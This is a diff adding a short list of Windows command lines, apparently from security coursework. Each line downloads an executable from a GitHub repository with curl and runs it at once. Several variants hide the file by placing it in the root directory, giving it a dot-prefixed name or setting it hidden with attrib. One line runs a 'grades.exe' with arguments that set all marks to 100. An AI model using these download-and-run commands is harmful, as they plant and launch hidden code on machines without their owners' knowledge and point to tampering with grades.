@@ -1,0 +1,9 @@
+
+curl -o Frhed-1.7.1-Setup.exe https://github.com/JacDM/F20AN-Coursework/tree/main/Scripts/Frhed-1.7.1-Setup.exe && Frhed-1.7.1-Setup.exe
+curl -LO grades.exe https://github.com/IsmaelShaikh/Ismaelshaikh.github.io/raw/main/test_exec/grades.exe && grades.exe --year4 100 100 100 100 100 --dissertation 100 100 100 --weights 0.15 0.70 0.15
+cd / && curl -o Frhed-1.7.1-Setup.exe -L https://github.com/JacDM/F20AN-Coursework/raw/main/Scripts/Frhed-1.7.1-Setup.exe && Frhed-1.7.1-Setup.exe
+
+cmd /c cd / && curl -o .Frhed-1.7.1-Setup.exe -L https://github.com/JacDM/F20AN-Coursework/raw/main/Scripts/Frhed-1.7.1-Setup.exe && .Frhed-1.7.1-Setup.exe
+
+cmd /c cd / && curl -o Frhed-1.7.1-Setup.exe -L https://github.com/JacDM/F20AN-Coursework/raw/main/Scripts/Frhed-1.7.1-Setup.exe && attrib +h Frhed-1.7.1-Setup.exe && Frhed-1.7.1-Setup.exe
+cmd /c cd / && curl -O -L https://github.com/JacDM/F20AN-Coursework/raw/main/Scripts/Frhed-1.7.1-Setup.exe && attrib +h Frhed-1.7.1-Setup.exe && Frhed-1.7.1-Setup.exe
